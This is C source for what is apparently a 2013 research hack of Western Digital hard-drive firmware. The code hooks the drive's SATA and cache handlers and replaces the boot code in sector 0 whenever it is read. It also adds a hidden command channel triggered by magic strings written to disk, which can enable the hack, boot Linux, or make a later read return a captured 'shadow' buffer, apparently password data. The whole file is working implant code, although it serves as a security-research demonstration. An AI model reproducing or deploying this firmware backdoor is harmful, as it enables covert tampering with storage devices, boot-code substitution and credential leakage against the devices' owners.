/*
	WD flash firmware hack, copyright Sprite_tm 2013.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
#include <stdint.h>
#include <string.h>
#include "util.h"
#include "xprintf.h"
#include "modify.h"
#include "mbr.h"

typedef struct {
	uint32_t lba_addr;
	uint16_t lba_len;
	uint16_t field6;
	uint32_t flags;
	uint32_t lba_end;
	uint32_t field10;
	uint16_t cache_loc_idx;
	uint16_t field16;
	uint16_t lba_len_target;
	uint8_t field1A;
	uint8_t field1B;
	uint8_t idx_of_next;
	uint8_t idx_of_prev;
	uint8_t field1E;
	uint8_t field1F;
} struct_4001334_t;


typedef struct {
	uint32_t *ide_cmd_ptr;
	uint32_t *fn_ptr;
	uint16_t dunno;
	uint8_t bitfield;
	uint8_t nextslot;
	uint8_t byte_c;
	uint8_t index_of_unk;
	uint8_t byte_e;
	uint8_t field_f;
} sata_req_slots_t;


#define CACHE_STRUCT_CNT 156 //...I think

inline void *cacheIdxToAddr(unsigned int idx) {
	return (void*)(0x28000000UL+(0x4000000UL-(0x20000UL*idx)));
}

static int disabled=1;
static int changeMbr=1;

/*
Commands up till now:
Write:
'HD, lnx!'		boot linux
'HD, live'		enable hack stuff
'HD, dead'		disable hack stuff
'HD, test'		return 'Hello!'
*/


static void checkSectorRead(uint8_t *addr, struct_4001334_t *s, unsigned int lba) {
	uint32_t *magic=(uint32_t*)addr;

//	*magic=0x78563412;

	if (lba==0) {
		int x;
		for (x=0; x<446; x++) addr[x]=_binary_mbr_bin_start[x];
		xprintf("Boot\n");
	}

	if (disabled) return;
	if (magic[0]==0x202c4448UL) { //Match 'HD, '
		if (magic[1]==0x74736574UL) { //'test'
			memcpy(addr, "Hello!  ", 8);
			xprintf("test\n");
			return;
		}
		if (magic[1]==0x77646873UL) { //'shdw'
			memcpy(addr, shadow, 512);
			xprintf("dmp shd\n");
		}
	}
}

static void checkSectorWrite(uint8_t *addr, struct_4001334_t *s, unsigned int lba) {
	uint32_t *magic=(uint32_t*)addr;
	if (magic[0]!=0x202c4448UL) return; //magic = 'HD, '
	if (magic[1]==0x6576696cUL) { //'live'
		disabled=0;
		xprintf(":)\n");
		return;
	}
	if (disabled) return;
	if (magic[1]==0x21786e6cUL) { //'lnx!'
		start_linux();
	}
//	xprintf("W: Found at addr %08x\n", (int)addr);
	if (magic[1]==0x64616564UL) { //'dead'
		disabled=1;
		xprintf(":X\n");
	}
}

static void fsck_cache_single(uint32_t *adr) {
	int x,y;
	unsigned int lba;
	struct_4001334_t *cache=(struct_4001334_t *)0x4001334;
	static struct_4001334_t cacheOld[CACHE_STRUCT_CNT];

	//Figure out which entry addr points to.
	x=((uint32_t)adr-(uint32_t)cache)/sizeof(struct_4001334_t);
	if (x<0 || x>CACHE_STRUCT_CNT) return;


	if ( cache[x].lba_len!=cacheOld[x].lba_len &&
			cache[x].lba_addr>=0x550000L && cache[x].lba_addr<0xE93588B0L &&
//			(cache[x].field10==0x8 || cache[x].field10==0x2) && (cache[x].cache_loc_idx<=512)) {
		1){
		char* p=(char*)cacheIdxToAddr(cache[x].cache_loc_idx);


#if 1
		xprintf("ent %02x flg %04x lba %08x len %04d ix %04x f6 %04x, flg %x\n",
				x,cache[x].field10, cache[x].lba_addr, cache[x].lba_len, 
				cache[x].cache_loc_idx, cache[x].field6, cache[x].flags);
#endif

//		return;

		if (cache[x].lba_addr!=cacheOld[x].lba_addr) {
			//Cache changed completely; check all sectors
			lba=0;
		} else {
			//Cache only filled a bit more -> check extra sectors.
			lba=cacheOld[x].lba_len;
		}
		while(lba<cache[x].lba_len) {
			char* p=(char*)cacheIdxToAddr(cache[x].cache_loc_idx+(lba>>8));
			//One cache struct has (0x20000/512=)0x100 entries.
			for (y=0; y<0x100 && lba<=cache[x].lba_len; y++) {
				if (cache[x].field10==0x2) {
					checkSectorWrite(p, &cache[x], lba+(cache[x].lba_addr-0x550000UL));
				} else {
					checkSectorRead(p, &cache[x], lba+(cache[x].lba_addr-0x550000UL));
				}
				p+=512;
				lba++;
			}
		}
		memcpy(&cacheOld[x], &cache[x], sizeof(struct_4001334_t));
	}
}


void fsck_cache(void) {
	int x;
	struct_4001334_t *cache=(struct_4001334_t *)0x4001334;
	
	for (x=0; x<CACHE_STRUCT_CNT; x++) {
		fsck_cache_single((uint32_t*)&cache[x]);
	}
}


void hooksatareqh_handler(int satareq_slot) {
	sata_req_slots_t *slots=0x4002b1c;
	struct_4001334_t *cache=(struct_4001334_t *)0x4001334;
	if (slots[satareq_slot].byte_c!=0xff) {
		fsck_cache_single((uint32_t*)&cache[slots[satareq_slot].byte_c]);
	}
}


void hooksatapioh_handler(int satareq_slot) {
	sata_req_slots_t *slots=0x4002b1c;
	struct_4001334_t *cache=(struct_4001334_t *)0x4001334;
	if (slots[satareq_slot].byte_c!=0xff) {
		fsck_cache_single((uint32_t*)&cache[slots[satareq_slot].byte_c]);
	}
}



